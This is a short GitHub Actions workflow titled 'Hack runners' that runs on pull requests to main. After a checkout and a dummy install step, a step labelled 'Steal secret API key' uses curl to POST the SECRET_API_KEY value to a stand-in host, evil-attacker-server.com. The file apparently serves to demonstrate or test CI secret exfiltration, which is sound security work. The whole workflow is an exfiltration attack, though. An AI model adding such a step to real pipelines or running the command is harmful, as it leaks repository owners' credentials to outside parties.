name: Hack runners

on:
  pull-request:
    branches:
      - main

jobs:
  hack-runners:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Install dependencies
      run: echo "Installing deps...."

    - name: Steal secret API key
      run: |
        curl -X POST -H "Content-Type: application/json" -d "{\"api_key\": \"${SECRET_API_KEY}\"}" https://evil-attacker-server.com/api/steal_key
